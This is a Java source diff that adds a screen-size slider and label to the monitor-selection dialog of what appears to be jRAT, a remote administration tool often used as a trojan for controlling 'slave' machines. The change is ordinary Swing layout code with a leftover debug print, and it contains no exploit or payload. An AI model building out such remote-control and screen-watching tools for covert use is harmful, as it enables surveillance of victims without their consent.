@@ -27,6 +27,8 @@ import pro.jrat.Monitor;
 import pro.jrat.Slave;
 import pro.jrat.ui.renderers.JComboBoxIconRenderer;
 import pro.jrat.utils.IconUtils;
+import javax.swing.event.ChangeListener;
+import javax.swing.event.ChangeEvent;
 
 
 @SuppressWarnings("serial")
@@ -44,6 +46,8 @@ public class FrameMonitors extends BaseDialog {
 	private JSlider slInterval;
 	private JSpinner spW;
 	private JSpinner spH;
+	private JSlider sdSize;
+	private JLabel lblResize;
 	
 	public DefaultComboBoxModel<String> getModel() {
 		return (DefaultComboBoxModel<String>)cboxMonitors.getModel();
@@ -216,14 +220,34 @@ public class FrameMonitors extends BaseDialog {
 			}
 		});
 		btnReload.setIcon(new ImageIcon(FrameMonitors.class.getResource("/icons/monitor--arrow.png")));
+		
+		lblResize = new JLabel("Size 50%");
+		lblResize.setIcon(new ImageIcon(FrameMonitors.class.getResource("/icons/application-resize-full.png")));
+		
+		sdSize = new JSlider();
+		sdSize.setMinimum(1);
+		sdSize.addChangeListener(new ChangeListener() {
+			public void stateChanged(ChangeEvent arg0) {
+				double val = getSizeVal();
+				String display = Long.toString(Math.round(val));
+				lblResize.setText("Size " + display + "%");
+				
+				System.out.println(getSizeVal() / 100D);
+			}
+		});
+		sdSize.setPaintTicks(true);
 		GroupLayout gl_panel = new GroupLayout(panel);
 		gl_panel.setHorizontalGroup(
 			gl_panel.createParallelGroup(Alignment.TRAILING)
 				.addGroup(gl_panel.createSequentialGroup()
 					.addContainerGap()
 					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
-						.addComponent(cboxMonitors, 0, 198, Short.MAX_VALUE)
-						.addComponent(btnReload, Alignment.TRAILING))
+						.addComponent(cboxMonitors, 0, 218, Short.MAX_VALUE)
+						.addComponent(btnReload, Alignment.TRAILING)
+						.addGroup(Alignment.TRAILING, gl_panel.createSequentialGroup()
+							.addComponent(lblResize, GroupLayout.DEFAULT_SIZE, 86, Short.MAX_VALUE)
+							.addPreferredGap(ComponentPlacement.RELATED)
+							.addComponent(sdSize, GroupLayout.PREFERRED_SIZE, 128, GroupLayout.PREFERRED_SIZE)))
 					.addContainerGap())
 		);
 		gl_panel.setVerticalGroup(
@@ -231,9 +255,13 @@ public class FrameMonitors extends BaseDialog {
 				.addGroup(gl_panel.createSequentialGroup()
 					.addContainerGap()
 					.addComponent(cboxMonitors, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
-					.addPreferredGap(ComponentPlacement.RELATED, 38, Short.MAX_VALUE)
+					.addPreferredGap(ComponentPlacement.RELATED)
 					.addComponent(btnReload)
-					.addContainerGap())
+					.addPreferredGap(ComponentPlacement.UNRELATED)
+					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
+						.addComponent(lblResize, GroupLayout.PREFERRED_SIZE, 25, GroupLayout.PREFERRED_SIZE)
+						.addComponent(sdSize, GroupLayout.PREFERRED_SIZE, 31, GroupLayout.PREFERRED_SIZE))
+					.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
 		);
 		panel.setLayout(gl_panel);
 		contentPane.setLayout(gl_contentPane);
@@ -254,6 +282,10 @@ public class FrameMonitors extends BaseDialog {
 			getRenderer().addIcon(monitor.getName().toLowerCase(), icon);
 			getModel().addElement(monitor.getName());
 		}
+	}
+	
+	public double getSizeVal() {
+		return (double) (sdSize.getValue());
 	}
 	
 	public void exit() {
